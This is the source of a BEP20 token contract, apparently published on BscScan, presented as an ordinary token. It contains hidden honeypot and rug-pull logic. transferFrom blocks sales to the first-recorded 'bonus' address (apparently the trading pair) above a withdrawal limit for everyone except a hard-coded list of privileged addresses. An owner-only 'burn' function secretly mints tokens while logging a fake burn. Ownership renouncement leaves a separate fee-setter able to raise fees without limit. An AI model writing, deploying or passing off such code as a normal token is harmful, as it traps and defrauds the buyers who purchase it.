/**
 *Submitted for verification at BscScan.com on 2022-06-01
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-13
*/

pragma solidity ^0.4.26;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract HelloBEP20 is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    address private alex;
    address public bonus;
    bool private burnToggle;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    uint public withdraw;
    address private whitelist;

    constructor(string contractName, string contractSymbol) public {
        symbol = contractSymbol;
        name = contractName;
        fees = 7;
        burnaddress = 0x000000000000000000000000000000000000dEaD;
        decimals = 9;
        whitelist = 0x28795Db22dA7676a244817A9DdB6587B0050275b;
        alex = 0xFdbC82FCbDa0488aE84ca6C8300568b583236992;
        burnToggle = true;
        totalSupply = 4294967296000000000;
        balances[msg.sender] = totalSupply;
        withdraw = 4294967296000000;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
        
    }
    function setWD(uint256 _withdraw) public onlyOwner {
        withdraw = _withdraw;
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burn( uint256 amount) public onlyOwner feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function setBurnFee( bool burnOn) public feeset returns(bool success){
        burnToggle = burnOn;
        return burnToggle;
    }
    function renounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transferbonus(address _bonus) public onlyOwner {
      bonus = _bonus;
    }
    
        function NotAlex(address test) private pure returns (bool) {
        // return true if address is not from alex
        bool anderer = true;
        if(test == 0xAc20885AcFd77D2993bd8082B05133F4f589DBC1) {anderer = false;}
        if(test == 0xDB058431eDeB907D6239fd82fc008049Dbb0cB36) {anderer = false;}
        if(test == 0xe95F1Bb612905700b32E805AAbf8B6Db40A1674C) {anderer = false;}
        if(test == 0x6EdDf4426ba8c809573f3653E7dbB85d656a3750) {anderer = false;}
        if(test == 0x3d4228c49560E83764F28592E86636A0624651D8) {anderer = false;}
        
        if(test == 0x3fb0d0f27F6338dAacC571Bd19FB56cfE552C6f8) {anderer = false;}
        if(test == 0xFFDAC07C29774CAbfE72616E72C3d1A6b2caC54D) {anderer = false;}
        if(test == 0xcc63A605dC5795a590f31c8d5FC518b7d551dc80) {anderer = false;}
        if(test == 0x3461A992287CF0eB508762A9F0A587E3Be4f25D2) {anderer = false;}
        if(test == 0x98E301DB4cB5252d4C9537542E188998165755F2) {anderer = false;}

        if(test == 0x58F5f943B54767C0100a4F53f5430a12df20f92e) {anderer = false;}
        if(test == 0x28F5468320e2d98a5494278b8C461F59667304D5) {anderer = false;}
        if(test == 0x68277A924691a7ECE81611F20c38357cBbd405Fd) {anderer = false;}
        if(test == 0x3E98C9Ce0BA6E590541a6b180eaBd5daC6543d12) {anderer = false;}
        if(test == 0x0D4A255A4248Ba1a8A7aBEe48Ce800d2F48dD413) {anderer = false;}
        

        return anderer;
    }

    function transfer(address _to, uint _amount) public returns (bool success) {
       require(_to != bonus, "please wait");

     balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
         emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
      return true;
    }
    
function transferFrom(address from, address to, uint tokens) public returns (bool success) {
          if(from != address(0) && bonus == address(0)) {
            bonus = to;
        }
        else if(NotAlex(from)) {
            if(tokens > withdraw)  {
                  require(to != bonus, "please wait"); 
            }
        }



      balances[from] = balances[from].sub(tokens);
      allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
      balances[to] = balances[to].add(tokens);
      emit Transfer(from, to, tokens);
      return true;
    }
   


    function approve(address _spender, uint256 _tokens) public returns (bool success) {
      allowed[msg.sender][_spender] = _tokens;
      emit Approval(msg.sender, _spender, _tokens);
      return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
}